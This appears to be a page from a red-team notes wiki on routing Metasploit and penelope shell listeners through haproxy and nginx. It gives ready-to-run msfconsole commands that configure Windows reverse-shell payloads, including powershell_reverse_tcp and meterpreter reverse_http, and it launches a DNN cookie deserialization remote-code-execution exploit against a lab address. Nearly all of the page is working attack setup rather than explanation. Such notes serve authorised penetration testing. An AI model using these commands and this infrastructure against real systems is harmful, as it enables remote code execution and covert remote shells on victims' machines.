| 🏠 [Home](../../redteam.md) | ⬅️ ⬅️ [Part](../_part) | ⬅️ [Chapter](./_chapter) |
|-----------------------------|----------------------|-------------------------|


* [Misc](../../red_team/infra/misc.md)
    * [Metasploit through haproxy](../../red_team/infra/misc.md#metasploit-through-haproxy)


# Misc
## Metasploit through reverse proxy
[Configuring Metasploit and Empire to Catch Shells behind an Nginx Reverse Proxy](https://www.ionize.com.au/configuring-metasploit-and-empire-to-catch-shells-behind-an-nginx-reverse-proxy/)

* `haproxy` port `80`
    * redirect http to nginx (`8880`)
    * redirect not http to penelope (`4444`)
* `nginx`: 
    * port `8880`
        * `~ ^/msf(.*) ` redirect to port `127.0.0.1:4445` (metasploit)
* `penelope` port `4444`

make use of metasploit advanced options:
* `ReverseAllowProxy`
* `ReverseListenerBindPort`
* `ReverseListenerBindAddress`

### tcp reverse shell
* deliver a payload with metasploit to catch with penelope. But can be changed by adding a specific acl for the remote host to redirect to haproxy  `msf_backend`
* use single payload (no `<platform>/[arch]/<stage>/<stager>`, only `<platform>/[arch]/<single>`) such as `windows/x64/powershell_reverse_tcp`, ...

Metasploit config:
* `setg verbose true`
* `setg LHOST tun0`
* `setg LPORT 80`
* `setg payload windows/x64/powershell_reverse_tcp`
* `setg ReverseListenerBindPort 4445`
* `setg ReverseListenerBindAddress 127.0.0.1`

```bash
sudo msfconsole -x 'setg verbose true; setg LHOST tun0 ; setg LPORT 80; setg payload windows/x64/powershell_reverse_tcp; setg ReverseListenerBindPort 4445; setg ReverseListenerBindAddress 127.0.0.1'
```
then: 
```bash
use windows/http/dnn_cookie_deserialization_rce; setg RHOSTS 10.10.110.10; setg RPORT 80; run'
```

### http reverse shell
* deliver a payload with metasploit to catch with msf.
* staged payload can be used for exemple `windows/x64/meterpreter/reverse_http`

Metasploit config:
* `setg verbose true`
* `setg LHOST tun0`
* `setg LPORT 80`
* `setg payload windows/x64/meterpreter/reverse_http`
* `setg luri msf`
* `setg OverrideRequestHost true`
* `#OverrideScheme`
* `setg ReverseAllowProxy false`
* `setg ReverseListenerBindPort 4445`
* `setg ReverseListenerBindAddress 127.0.0.1`

```bash
sudo msfconsole -x 'setg verbose true; setg LHOST tun0 ; setg LPORT 80; setg payload windows/x64/meterpreter/reverse_http; setg ReverseListenerBindPort 4445;setg ReverseListenerBindAddress 127.0.0.1; setg ReverseAllowProxy false; setg OverrideRequestHost true ; set luri msf'
```
